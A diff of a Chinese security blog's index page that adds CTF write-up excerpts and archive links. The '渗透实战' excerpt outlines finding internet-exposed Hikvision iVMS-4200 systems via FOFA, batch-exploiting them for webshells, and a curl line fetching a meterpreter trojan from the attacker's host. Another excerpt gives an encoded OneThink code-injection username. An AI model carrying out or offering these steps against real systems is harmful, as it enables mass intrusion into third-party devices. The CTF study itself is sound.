@@ -339,17 +339,46 @@
     
     
     <article class="index-post">
-        <a class="abstract-title" href = "/2019/01/03/swpu/" >
+        <a class="abstract-title" href = "/2019/04/03/nginx的秘密wp/" >
+            
+                <span>nginx的秘密wp</span>
+        </a>
+        <div class="abstract-content">
+            nginx的秘密wp
+刚拿到手还以为是sql约束攻击，发现测试未果
+看题目为nginx的秘密想到可能和nginx的配置有关于是百度搜索nginx配置漏洞Nginx不安全配置可能导致的安全漏洞 
+
+目录遍历漏洞Nginx默认是不允许列出整个目录的。如需此功能，打开nginx.conf文件，在location server 或 http段中加入autoindex on;
+$uri导致的CRLF注入漏洞(理论上，只要是可以设置HTTP头的场景都会出现这个问题。)，$uri 和  $document_uri表示的是解码以后的请求路径，不带参数,$request_uri表示的是完整的URI（没有解...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/03</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/01/03/swpuctf总结/" >
             
                 <span>SWPUCTF 2018 Web题和线下赛总结</span>
         </a>
         <div class="abstract-content">
-            线上赛前言
-今年第一次打SWPU，发现web题目质量很不错，为了线下赛连续准备了两天，晚上都睡得很晚，这次比赛是西南石油的师傅举办的公益性比赛，学院不支持，自掏腰包办比赛，感谢西南石油的师傅们用心准备的web题和线下赛，以下是详细记录。
-Web
-用优惠码买个X?
-这个题发现www.zip下有个源码泄露，下载来发现代码如下：
-123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php//生成优惠码$_SESSION[&apos;seed...
+            第九届swpuctf杂项题，web题加线下赛攻防总结
+线上赛MISC流量签到题流量包拖wireshark追TCP包或者直接用文档编辑器打开ctrl加f搜索关键字
+床前明月光,低头…99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33键盘密码 99就代表9那列的第二个值
+look ….. 依次读就行了
+签到题第一个flag在文件末尾
+所以修改高度为FF在底部可以看到另一半flag
+web用优惠码 买个 X ?这个题发现www.zip下有个源码泄露，下载来发现代码如下12345678910111213141516171819202122232425262728...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
@@ -454,13 +483,48 @@ e.data.iframe.value.indexOf(&quot;//&qu...
     
     
     <article class="index-post">
-        <a class="abstract-title" href = "/2018/07/23/巅峰极客/" >
+        <a class="abstract-title" href = "/2018/08/23/渗透海康卫视/" >
+            
+                <span>渗透实战</span>
+        </a>
+        <div class="abstract-content">
+            渗透实战fofa搜索引擎搜索 “iVMS-4200”
+
+信息收集漏洞利用教程
+批量利用构造批量攻击exp。将url导入url.txt中。python运行攻击exp
+ptyhon haikang.py -f url.txt
+getshell批量getshell
+用菜刀连接webshell
+用Python建立一个http服务用来传输文件
+python -m SimpleHTTPServer 8080
+
+生成免杀木马免杀教程
+##上传木马
+webshell打开命令行窗口运行如下命令，下载生成好的meterpreter木马到目标机上
+curl yourip:8000/bk.exe -f bk.e...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/23</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2018/07/28/巅峰极客/" >
             
                 <span>巅峰极客2018第一场部分wp</span>
         </a>
         <div class="abstract-content">
-            #web：
-拿到题目先百度一下，于是找到onethink的一个漏洞。
+            web：拿到题目先百度一下，于是找到onethink的一个漏洞。
 WooYun-2016-185742
 就是注册个账号为：
 %250a%24a%3d%24_GET%5ba%5d%3b%2f%2f%250aecho+%60%24a%60%3b%2f%2f
@@ -468,12 +532,12 @@ WooYun-2016-185742
  账号一的用户名：%0a$a=$_GET[a];//
  账号二的用户名：%0aecho $a;//
  注意要用burp来改包，不然会失败。之后依次登入，也要用burp来改包登入。在那之后然后访问生成的缓存文件
-本题的关键是通过源码www.zip泄露在本地浮现的时候找到...
+本题的关键是通过源码www.zip泄露在本地浮现的时候找到生成...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
             <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/23</span>
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/28</span>
             </div>
             <!-- tags  -->
             
@@ -766,9 +830,106 @@ WooYun-2016-185742
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 13
+        Total : 20
         </div>
         <!-- search  -->
         
@@ -784,7 +945,22 @@ WooYun-2016-185742
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/2020/03/14/靶机二/" >域渗透靶机二</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2020/03/10/ntlm请求发起/" >ntlm请求发起</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2020/02/23/抓密码/" >各种姿势的hash抓取</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/12</span><a class="archive-post-title" href= "/2020/02/12/keberos/" >keberos协议</a>
         </li>
     
     
@@ -798,7 +974,7 @@ WooYun-2016-185742
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/2019/08/23/ntlm请求发起/" >ntlm请求发起</a>
+            <span class="archive-post-date">08/14</span><a class="archive-post-title" href= "/2019/08/14/Matrix1/" >vulnhub|渗透测试Matrix</a>
         </li>
     
     
@@ -808,22 +984,37 @@ WooYun-2016-185742
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2019/02/23/Matrix 1/" >vulnhub|渗透测试Matrix 1</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href= "/2019/05/22/Moonraker/" >渗透测试|Moonraker</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2019/02/23/SICKOS/" >SICKOS 1.1 - CTF</a>
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2019/04/11/redis未授权/" >redis未授权</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2019/02/23/Moonraker/" >渗透测试|Moonraker</a>
+            <span class="archive-post-date">04/03</span><a class="archive-post-title" href= "/2019/04/03/nginx的秘密wp/" >nginx的秘密wp</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/03</span><a class="archive-post-title" href= "/2019/01/03/swpu/" >SWPUCTF 2018 Web题和线下赛总结</a>
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/2019/03/12/SICKOS/" >SICKOS</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2019/02/23/MERCY/" >渗透测试MERCY</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/03</span><a class="archive-post-title" href= "/2019/01/03/swpuctf总结/" >SWPUCTF 2018 Web题和线下赛总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/2019/01/01/swpuawd/" >swpuawd赛前准备</a>
         </li>
     
     
@@ -847,17 +1038,22 @@ WooYun-2016-185742
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2018/08/31/rwctf/" >rwctf和南电新生平台一题</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2018/08/31/ctf入门总结/" >ctf入门总结</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2018/07/23/巅峰极客/" >巅峰极客2018第一场部分wp</a>
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2018/08/31/rwctf/" >rwctf和南电新生平台一题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/2018/08/23/渗透海康卫视/" >渗透实战</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/28</span><a class="archive-post-title" href= "/2018/07/28/巅峰极客/" >巅峰极客2018第一场部分wp</a>
         </li>
     
     
